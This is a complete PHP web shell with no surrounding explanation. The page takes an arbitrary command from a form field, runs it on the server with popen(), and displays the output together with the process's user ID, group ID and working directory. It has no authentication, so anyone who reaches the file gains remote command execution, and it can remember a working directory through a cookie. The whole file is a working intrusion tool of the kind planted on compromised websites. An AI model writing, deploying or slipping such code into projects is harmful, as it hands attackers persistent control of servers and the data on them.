<?php

function sh($cmd) {
	$handle = popen($cmd . ' 2>&1', 'r');
	$read = '';
	while(!feof($handle)) {
		$read .= fread($handle, 4096);
	}
	pclose($handle);
	return $read;
}

function stripslashes_deep(&$value)
{
	$value = is_array($value) ?
		array_map('stripslashes_deep', $value) :
		stripslashes($value);

	return $value;
}

if(get_magic_quotes_gpc()) {
	stripslashes_deep($_GET);
	stripslashes_deep($_POST);
	stripslashes_deep($_COOKIE);
}

if(!empty($_POST['chdir'])) {
	setcookie('chdir', $_POST['chdir']);
}
if(!empty($_POST['undir'])) {
	setcookie('chdir', NULL);
}

if(!empty($_POST['chdir'])) {
	chdir($_POST['chdir']);
} else if(isset($_COOKIE['chdir'])) {
	chdir($_COOKIE['chdir']);
}

error_reporting(E_ALL);
ini_set('display_errors', 1);

if(!isset($_POST['submit'])) {
	$_POST['cmd'] = 'uname -a';
}

$cmd = $_POST['cmd'];

$prompt = sprintf('uid(%s):gid(%s)@%s', getmyuid(), getmygid(), getcwd());
?>
<head>
<style type="text/css">
pre {
	width: 99%;
	overflow: auto;
	border: 1px solid #4c4;
	font: 10pt/14pt "Lucida Console", mono-space;
	margin: 0;
}
pre#stdout {
	height: 200px;
}
</style>
</head>
<body>
<pre id="stdin"><?php echo $prompt, '&gt;<br>', htmlspecialchars($cmd); ?></pre>
<pre id="stdout"><?php echo htmlspecialchars(sh($cmd)); ?></pre>
<form action="" method="post">
<p>
<label>Command:<br>
<textarea rows="8" cols="45" name="cmd"><?php echo htmlspecialchars($_POST['cmd']); ?></textarea>
</label>
</p>
<p>
<input type="submit" name="submit" value="Execute">
</p>
<p>
<label>Make default directory:<br>
<input type="text" name="chdir">
<input type="submit" name="undir" value="Reset">
</label>
</p>
</form>
